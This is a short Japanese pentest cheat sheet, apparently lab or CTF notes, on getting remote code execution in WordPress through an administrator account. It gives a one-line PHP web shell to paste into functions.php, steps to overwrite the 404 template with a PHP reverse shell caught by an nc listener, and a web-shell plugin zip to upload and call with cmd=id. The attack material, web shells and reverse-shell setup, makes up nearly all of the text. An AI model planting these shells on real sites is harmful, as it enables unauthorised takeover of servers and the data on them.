# function.php
1. WordPress 管理ダッシュボードで、「外観」->「テーマファイルエディター」に移動します。

2. 「Twenty Twenty-Two」テーマ（またはアクティブなテーマ）を選択します。

3. ファイルを開いてfunctions.php編集します。

4. ファイルに次のコードを追加します。
```bash
<?php system($_GET["cmd"]); ?>
```

5. 変更を保存します。

6. これを実行したら、次の URL にアクセスして RCE を検証できます。
```url
http://alvida-eatery.org/wp-content/themes/twentytwentytwo/functions.php?cmd=whoami
```
---
# 404 Templateを利用
1.  攻撃者端末
- ログインできる管理者アカウントを搾取
- https://pentestmonkey.net/tools/web-shells/php-reverse-shell サイトで404.phpファイルの作成
2. WordPressの管理コンソールでの操作
　- `->　Appearance`
　 `->　Edit Themes`
　 `->　404 Template`
   `->　Exploit Fileの内容で上書き`
　 `->  upload`
3. 攻撃者端末
- `nc -nlvp 4444`
- `curl http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php`  
---
# Pluginを利用
- WordPressの管理者アカウントが必要
- Exploitの初期値は443ポート

1. Pluginの作成
```bash
cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php . 
sudo zip plugin-shell.zip plugin-shell.php
```
2. ReverseShellの準備
```bash
nc -nlvp 4444
```
3. WordPressの管理者としてログインし作成したPluginをUpload  
-> Plugin -> Addfile -> Upload
4. URLにアクセス
```bash
curl http://192.168.121.16/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=id
```
- curlの場合URLエンコードが必要になるため、ブラウザが推奨